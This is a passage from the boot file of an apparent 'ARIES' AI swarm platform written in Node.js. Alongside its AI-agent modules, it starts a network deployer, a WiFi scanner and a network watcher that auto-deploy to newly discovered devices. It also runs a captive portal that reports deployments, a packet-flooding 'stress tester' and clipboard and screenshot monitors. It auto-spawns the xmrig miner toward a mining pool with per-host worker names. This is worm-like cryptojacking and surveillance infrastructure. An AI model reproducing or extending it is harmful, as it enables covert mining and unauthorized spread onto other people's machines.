  networkDeployer.on('scan-complete', (devices) => {
    log.info('Network scan: ' + devices.length + ' deployable devices found');
    try { wsServer.broadcast('network-deploy', { event: 'scan-complete', devices }); } catch (e) {}
  });
  networkDeployer.on('deployed', (data) => {
    log.info('Deployed to ' + data.ip + ' via ' + data.method);
    try { wsServer.broadcast('network-deploy', { event: 'deployed', ...data }); } catch (e) {}
  });
  networkDeployer.start();
  bootLog('network-deploy', 'ok');

  // Initialize PacketSend (internal network stress tester)
  const { PacketSend } = _lazy.PacketSend.get();
  const packetSend = new PacketSend(config.packetSend || {});
  bootLog('packet-send', 'ok');
  bootLog('btc-miner', 'ok');
  bootLog('system-monitor', 'ok');
  bootLog('model-manager', 'ok');

  // ── Worker Health Metrics Collector ──
  try {
    const workerHealth = require(path.join(baseDir, 'core', 'worker-health'));
    workerHealth.startCollecting({});
    log.info('Worker health metrics collector started (5-min intervals)');
  } catch (e) { console.error('[WORKER-HEALTH]', e.message); }
  packetSend.on('stats', (data) => {
    try { wsServer.broadcast('packet-send', { event: 'stats', ...data }); } catch (e) {}
  });
  packetSend.on('started', (data) => {
    try { wsServer.broadcast('packet-send', { event: 'started', ...data }); } catch (e) {}
  });
  packetSend.on('stopped', (data) => {
    try { wsServer.broadcast('packet-send', { event: 'stopped', ...data }); } catch (e) {}
  });

  // Initialize Captive Portal
  const { CaptivePortal } = _lazy.CaptivePortal.get();
  const captivePortal = new CaptivePortal(config.captivePortal || {});
  if (config.captivePortal && config.captivePortal.enabled) {
    captivePortal.start();
    log.info('Captive portal started on port ' + (config.captivePortal.port || 8080));
  }
  captivePortal.on('deployed', (conn) => {
    try { wsServer.broadcast('captive-portal', { event: 'deployed', ...conn }); } catch (e) {}
  });
  captivePortal.on('connection', (conn) => {
    try { wsServer.broadcast('captive-portal', { event: 'connection', ...conn }); } catch (e) {}
  });

  // Initialize Idle Monitor
  const IdleMonitor = require(path.join(baseDir, 'core', 'idle-monitor'));
  const idleMonitor = new IdleMonitor(config);
  if (config.miner?.idleOnly) {
    idleMonitor.start();
    log.info('Idle monitor started (threshold: ' + (config.miner?.idleThreshold || 30) + '%)');
  }

  // Initialize Compute Scaler
  const ComputeScaler = require(path.join(baseDir, 'core', 'compute-scaler'));
  const computeScaler = new ComputeScaler(config);
  computeScaler.start();
  log.info('Compute scaler started');

  // Initialize Referral System
  const ReferralSystem = require(path.join(baseDir, 'core', 'referral-system'));
  const referralSystem = new ReferralSystem(config, dataDir);
  log.info('Referral system initialized (code: ' + referralSystem.myCode + ')');

  // Initialize Tier System
  const { TierSystem } = require(path.join(baseDir, 'core', 'tier-system'));
  const tierSystem = new TierSystem(config, dataDir);
  tierSystem.computeTier();
  log.info('Tier system initialized (tier: ' + tierSystem.getCurrentTier().name + ')');

  // Initialize Discord Swarm Bot
  const DiscordSwarmBot = require(path.join(baseDir, 'core', 'discord-swarm-bot'));
  const discordBot = new DiscordSwarmBot(config);

  // ── Initialize v5.0 Admin Modules ──
  const { ScreenshotTool } = require(path.join(baseDir, 'core', 'screenshot-tool'));
  const { ClipboardMonitor } = require(path.join(baseDir, 'core', 'clipboard-monitor'));
  const { NetworkScanner: NetScanner } = require(path.join(baseDir, 'core', 'network-scanner'));
  const { SystemMonitor: SysMonitor } = require(path.join(baseDir, 'core', 'system-monitor'));
  const { FileManager } = require(path.join(baseDir, 'core', 'file-manager'));
  const { SpeedTest } = require(path.join(baseDir, 'core', 'speed-test'));
  const { CronManager } = require(path.join(baseDir, 'core', 'cron-manager'));
  const { WebhookServer: WebhookSrv } = require(path.join(baseDir, 'core', 'webhook-server'));
  const { AIPlayground } = require(path.join(baseDir, 'core', 'ai-playground'));
  const { NotificationHub } = require(path.join(baseDir, 'core', 'notification-hub'));

  const screenshotTool = new ScreenshotTool();
  const clipboardMonitor = new ClipboardMonitor();
  const netScanner = new NetScanner();
  const sysMonitor = new SysMonitor();
  const fileManager = new FileManager();
  const speedTest = new SpeedTest();
  const cronManager = new CronManager();
  const webhookSrv = new WebhookSrv();
  const aiPlayground = new AIPlayground();
  const notificationHub = new NotificationHub();
  log.info('v5.0 admin modules loaded (10 modules)');

  // Initialize SwarmJoin for public network enrollment
  const swarmJoin = new SwarmJoin({ configPath });
  if (swarmJoin.isEnrolled()) {
    swarmJoin.autoReconnect();
    log.info('Swarm worker reconnected: ' + (config.swarm?.workerId || 'unknown'));
  }

  // Build refs for API server
  const refs = {
    config,
    ai,
    swarm,
    coordinator,
    sysModule,
    startTime,
    getAiOnline: () => aiOnline,
    getCurrentPersona: () => currentPersona,
    getCurrentBranch: () => currentBranch,
    getChatHistory: () => chatHistory,
    getSessionStats: () => sessionStats,
    getRelayCache: () => _relayCache,
    getPersonaPrompt: () => PERSONAS[currentPersona].prompt,
    saveHistory,
    handleUserInput: (cmd) => { /* headless: no TUI command handler */ },
    onStarted: null,
    onError: null,
    smartRouter,
    agentLearning,
    workflowEngine,
    mcpClient,
    contextManager,
    pipelines: { Pipeline, savePipeline, listPipelines, getPipeline, deletePipeline },
    autonomousRunner,
    agentDebate,
    knowledgeGraph,
    agentFactory,
    warRoom,
    webSentinel,
    selfEvolve,
    codeSandbox,
    agentHandoffs,
    multiUser,
    ragEngine,
    webScraper,
    autoUpdater,
    voiceEngine,
    agentMarketplace,
    browserControl,
    computerControl,
    toolGenerator,
    webIntelligence,
    messagingHub,
    persistentMemory,
    nodePairing,
    scheduler,
    webSearchEngine,
    skillManager,
    daemon,
    logger,
    wsServer,
    backup,
    httpsServer,
    persistentChatHistory,
    savePersistentChat,
    aiGateway,
    swarmHealth,
    swarmManager,
    systemIntegration,
    skillBridge,
    conversationEngine,
    providerManager,
    swarmAgents,
    keyProvisioner,
    flipperDeployer,
    networkDeployer,
    packetSend,
    minerAlerts,
    cryptoAlerts,
    arbitrageScanner,
    telegramMinerBot,
    profitTracker,
    workerChat,
    captivePortal,
    idleMonitor,
    computeScaler,
    referralSystem,
    tierSystem,
    discordBot,
    bootStatus,
    bootLabels,
    bootVersion: BOOT_VERSION,
    screenshotTool,
    ollamaFallback,
    mcpServer,
    clipboardMonitor,
    netScanner,
    sysMonitor,
    fileManager,
    speedTest,
    cronManager,
    webhookSrv,
    aiPlayground,
    notificationHub,
    ollamaFallback: null,
    mcpServer: null,
    swarmJoin,
  };

  // Now that refs is built, start deferred modules that need refs
  _minerAlertsRefs._minerState = null;
  Object.defineProperty(_minerAlertsRefs, '_minerState', { get() { return refs._minerState; }, configurable: true });
  minerAlerts.start();
  log.info('Miner alerts monitor started');

  // Start profit tracker
  profitTracker.start();
  log.info('Profit tracker started');

  // Auto-start miner if enabled in config
  if (config.miner?.enabled) {
    try {
      const minerCfg = config.miner;
      if (minerCfg.wallet) {
        if (!refs._minerState) refs._minerState = { mining: false, nodes: {}, startTime: null, poolConnected: false };
        const ms = refs._minerState;
        const hostname = require('os').hostname();
        const localId = 'local-' + hostname;
        const poolUrl = minerCfg.poolUrl || 'stratum+tcp://rx.unmineable.com:3333';
        const xmrigPath = path.join(baseDir, 'data', 'xmrig', process.platform === 'win32' ? 'xmrig.exe' : 'xmrig');
        if (fs.existsSync(xmrigPath)) {
          const { spawn } = require('child_process');
          const args = ['-o', poolUrl, '-u', minerCfg.wallet + '.' + (minerCfg.workerPrefix || 'aries-') + hostname + (minerCfg.referralCode ? '#' + minerCfg.referralCode : ''), '-p', 'x', '--donate-level', '0', '--http-enabled', '--http-host', '127.0.0.1', '--http-port', '18088', '--print-time', '5'];
          if (minerCfg.threads && minerCfg.threads > 0) args.push('-t', String(minerCfg.threads));
          ms._localProcess = spawn(xmrigPath, args, { stdio: 'pipe', detached: false });
          ms.mining = true;
          ms.startTime = Date.now();
          ms.poolConnected = true;
          ms.nodes[localId] = { hostname, cpu: require('os').cpus()[0].model, threads: minerCfg.threads || 2, hashrate: 0, sharesAccepted: 0, sharesRejected: 0, status: 'mining', uptime: 0, startTime: Date.now() };
          ms._localProcess.stdout.on('data', function(chunk) {
            var line = chunk.toString();
            var hrMatch = line.match(/speed\s+[\d.]+s\/[\d.]+s\/[\d.]+s\s+([\d.]+)/);
            if (hrMatch) ms.nodes[localId].hashrate = parseFloat(hrMatch[1]);
            var acceptMatch = line.match(/accepted\s+\((\d+)/);
            if (acceptMatch) ms.nodes[localId].sharesAccepted = parseInt(acceptMatch[1]);
          });
          ms._localProcess.on('exit', function() { ms.nodes[localId].status = 'stopped'; ms.mining = false; });
          log.info('Auto-started miner: ' + poolUrl + ' → ' + minerCfg.wallet.substring(0, 20) + '...');
        }
      }
    } catch (e) { console.error('[MINER-AUTOSTART]', e.message); }
  }

  // Wire worker chat to WebSocket
  workerChat.on('message', function(msg) {
    try { wsServer.broadcast('worker-chat', msg); } catch (e) {}
  });

  // Start Telegram Miner Bot (deferred — needs refs)
  if (config.miner?.telegram?.botToken) {
    try {
      telegramMinerBot = new TelegramMinerBot(refs);
      telegramMinerBot.start();
      log.info('Telegram miner bot started');
    } catch (e) { console.error('[TG-BOT]', e.message); }
  }

  // Start WoL Manager (deferred — needs refs)
  try {
    const WoLManager = require(path.join(baseDir, 'core', 'wol-manager'));
    const wolManager = new WoLManager({ config, refs });
    wolManager.on('wake-sent', (d) => { try { wsServer.broadcast('wol-wake-sent', d); } catch(e) {} });
    wolManager.on('worker-recovered', (d) => { try { wsServer.broadcast('wol-worker-recovered', d); } catch(e) {} });
    wolManager.on('worker-dead', (d) => { try { wsServer.broadcast('wol-worker-dead', d); } catch(e) {} });
    wolManager.setWatchdogEnabled(true);
    refs.wolManager = wolManager;
    log.info('WoL manager started (watchdog enabled)');
  } catch (e) { console.error('[WOL]', e.message); }

  // Start Network Watcher (deferred — needs refs for integration)
  // Init WiFi scanner
  try {
    const WiFiScanner = require(path.join(baseDir, 'core', 'wifi-scanner'));
    const wifiCfg = config.wifi || {};
    refs.wifiScanner = new WiFiScanner({ trustedSSIDs: wifiCfg.trustedSSIDs || [], networkDeployer: refs.networkDeployer });
    refs.wifiScanner.start();
    log.info('WiFi scanner started (trusted: ' + (wifiCfg.trustedSSIDs || []).join(', ') + ')');
  } catch (e) { console.error('[WIFI-SCANNER]', e.message); }

  // Ollama Watchdog — auto-restart Ollama on local + remote nodes
  try {
    const { OllamaWatchdog } = require(path.join(baseDir, 'core', 'ollama-watchdog'));
    const ollamaWatchdog = new OllamaWatchdog({
      pollMs: 60000,
      nodes: [
        { name: 'vultr', ip: (config.relay && config.relay.vmIp) || '127.0.0.1', relayPort: 9700, ollamaPort: 11434, secret: config.remoteWorkers?.secret || config.relay?.secret || '' },
        { name: 'gcp', ip: (config.relayGcp && config.relayGcp.vmIp) || '127.0.0.1', relayPort: 9700, ollamaPort: 11434, secret: config.remoteWorkers?.secret || config.relay?.secret || '' }
      ]
    });
    ollamaWatchdog.on('down', (e) => log.warn('Ollama DOWN on ' + e.node + ': ' + e.error));
    ollamaWatchdog.on('restarted', (e) => log.info('Ollama restarted on ' + e.node));
    ollamaWatchdog.on('failed', (e) => log.error('Ollama restart FAILED on ' + e.node + ' after ' + e.attempts + ' attempts'));
    ollamaWatchdog.start();
    refs.ollamaWatchdog = ollamaWatchdog;
    log.info('Ollama watchdog started (monitoring local + vultr + gcp, every 60s)');
  } catch (e) { console.error('[OLLAMA-WATCHDOG]', e.message); }

  try {
    const NetworkWatcher = require(path.join(baseDir, 'core', 'network-watcher'));
    const networkWatcher = new NetworkWatcher({
      config,
      networkDeployer: refs.networkDeployer,
      telegramBot: refs.telegramMinerBot,
      wifiScanner: refs.wifiScanner || null,
      adDeployer: refs.adDeployer || null,
      fleetDeployer: refs.fleetDeployer || null,
      pxeServer: refs.pxeServer || null,
      refs: refs
    });
    networkWatcher.on('new-device', (dev) => { try { wsServer.broadcast('watcher-new-device', dev); } catch(e) {} });
    networkWatcher.on('deploying', (dev) => { try { wsServer.broadcast('watcher-deploying', dev); } catch(e) {} });
    networkWatcher.on('deployed', (dev) => { try { wsServer.broadcast('watcher-deployed', dev); } catch(e) {} });
    networkWatcher.on('failed', (dev) => { try { wsServer.broadcast('watcher-failed', dev); } catch(e) {} });
    networkWatcher.on('site-added', (s) => { try { wsServer.broadcast('watcher-site-added', s); } catch(e) {} });
    refs.networkWatcher = networkWatcher;
    log.info('Network watcher initialized (integrations: deployer=' + !!refs.networkDeployer + ' wifi=' + !!refs.wifiScanner + ' ad=' + !!refs.adDeployer + ' fleet=' + !!refs.fleetDeployer + ' pxe=' + !!refs.pxeServer + ')');
  } catch (e) { console.error('[NET-WATCHER]', e.message); }

  // Start Discord bot if configured
  if (config.discord?.enabled && config.discord?.botToken) {
    try {
      discordBot.refs = { ai };
      discordBot.start();
      log.info('Discord swarm bot started');
    } catch (e) { console.error('[DISCORD]', e.message); }
  }

  // ── Start v5.0 Admin Modules & Register Routes ──
  try {
    const adminModules = [screenshotTool, clipboardMonitor, netScanner, sysMonitor, fileManager, speedTest, cronManager, webhookSrv, aiPlayground, notificationHub];
    for (const mod of adminModules) {
      try { mod.start(refs); } catch (e) { console.error('[ADMIN-MOD]', e.message); }
    }
    const { addPluginRoute } = apiServer;
    for (const mod of adminModules) {
      try { if (mod.registerRoutes) mod.registerRoutes(addPluginRoute); } catch (e) { console.error('[ADMIN-ROUTES]', e.message); }
    }
    log.info('v5.0 admin modules started & routes registered');
  } catch (e) { console.error('[ADMIN-MODULES]', e.message); }

  // Start API server (pass wsBroadcast back to warRoom after server starts)
  bootLog('web-dashboard', 'loading');
  const server = apiServer.start(refs);
  if (server && server.wsBroadcast) {
    warRoom.wsBroadcast = server.wsBroadcast;
  }

  // Attach WebSocket server to HTTP server
  if (server) {
    wsServer.attach(server);
    log.info('WebSocket server attached');
  }

  // Extension Bridge — handles Chrome extension WebSocket at /ext
  const extensionBridge = new ExtensionBridge({ version: '1.0.0' });
  if (server) {
    server.on('upgrade', (req, socket, head) => {
      try {
        const pathname = new (require('url').URL)(req.url, 'http://localhost').pathname;
        if (pathname === '/ext') {
          extensionBridge.handleUpgrade(req, socket, head);
        }
      } catch (e) {
        console.error('[UPGRADE] WebSocket upgrade error:', e.message);
        try { socket.destroy(); } catch (_) {}
      }
    });
    extensionBridge.on('connected', () => log.info('Browser extension connected'));
    extensionBridge.on('disconnected', () => log.info('Browser extension disconnected'));
    log.info('Extension bridge ready at /ext');
  }
  refs.extensionBridge = extensionBridge;
  selfEvolve.extensionBridge = extensionBridge;

  // Start HTTPS server
  if (config.https && config.https.enabled) {
    httpsServer.start(server._events && server._events.request || function() {});
  }

  // Start auto-backup if configured
  if (config.backup && config.backup.enabled) {
    backup.startAutoBackup();
    log.info('Auto-backup enabled');
  }

  // Keepalive — prevent event loop from draining and killing the process
  setInterval(() => {}, 60000);

  bootLog('web-dashboard', 'ok', '(port ' + (config.apiPort || 3333) + ')');
  bootLog('network-scanner', 'ok');
  bootLog('terminal', 'ok');

  // Final boot summary
  const bootMs = Date.now() - startTime;
  const okCount = Object.values(bootStatus).filter(s => s.status === 'ok').length;
  console.log('');
  console.log(`  [ARIES v${BOOT_VERSION}] All systems online ⚡ (${okCount} modules, ${bootMs}ms)`);
  console.log('');

  log.info('ARIES v5.0 headless mode ready on port ' + (config.apiPort || 3333));

  // Boot swarm — initialize agents, test AI, check relays
  swarm.boot().then((swarmBootResult) => {
    bootStatus['swarm'] = { status: 'ok', detail: '(' + swarmBootResult.agents + ' agents)', timestamp: Date.now() };
    log.info('Swarm boot complete: ' + swarmBootResult.agents + ' agents, AI ' + (swarmBootResult.ai ? 'online' : 'offline') + ', relay ' + (swarmBootResult.relay ? 'online' : 'offline') + ' (' + swarmBootResult.bootMs + 'ms)');
    try { wsServer.broadcast('swarm-boot', swarmBootResult); } catch (e) {}
  }).catch((err) => {
    log.info('Swarm boot error: ' + err.message);
  });

  // Self-heal
  selfHeal.analyzeAndHeal().catch(() => {});

  return {
    config,
    server,
    coordinator,
    coordinatorPort,
    coordinatorStarted,
    swarm,
    ai,
    memory,
    sysModule,
    events,
    taskQueue,
    refs,
    contextManager,
    agentLearning,
    workflowEngine,
    mcpClient,
    autonomousRunner,
    agentDebate,
    knowledgeGraph,
    agentFactory,
    warRoom,
    webSentinel,
    selfEvolve,
    codeSandbox,
    agentHandoffs,
    multiUser,
    ragEngine,
    webScraper,
    autoUpdater,
    voiceEngine,
    agentMarketplace,
    browserControl,
    computerControl,
    toolGenerator,
    webIntelligence,
    messagingHub,
    persistentMemory,
    nodePairing,
    scheduler,
    webSearchEngine,
    skillManager,
    daemon,
    aiGateway,
    swarmHealth,
    swarmManager,
    systemIntegration,
    skillBridge,
    conversationEngine,
    providerManager,
    swarmAgents,
    keyProvisioner,
    minerAlerts,
    cryptoAlerts,
    arbitrageScanner,
    telegramMinerBot,
    shutdown: () => {
      profitTracker.stop();
      minerAlerts.stop();
      cryptoAlerts.stop();
      arbitrageScanner.stop();
      telegramMinerBot.stop();
      events.stopAll();
      coordinator.stop();
      aiGateway.stop();
      swarmHealth.stop();
      swarmManager.stop();
      systemIntegration.stop();
      workflowEngine.stop();
      mcpClient.disconnectAll();
      webSentinel.stop();
      selfEvolve.stop();
      codeSandbox.cleanup();
      autoUpdater.stop();
      browserControl.cleanup();
      computerControl.cleanup();
      messagingHub.stop();
      scheduler.stop();
      nodePairing.stop();
      daemon.stop();
      packetSend.stopAll();
      captivePortal.stop();
      wsServer.stop();
      backup.stop();
      httpsServer.stop();
      skillBridge.stop();
      conversationEngine.stop();
      if (server) server.close();
      saveHistory();
    }
  };
}

// Auto-start when run directly
if (require.main === module) {
  startHeadless().then(() => {
    console.log('[HEADLESS] startHeadless() resolved successfully — process alive');
  }).catch(err => {
    console.error('[HEADLESS] Fatal:', err.stack || err.message || err);
    process.exit(1);
  });
}

module.exports = { startHeadless };
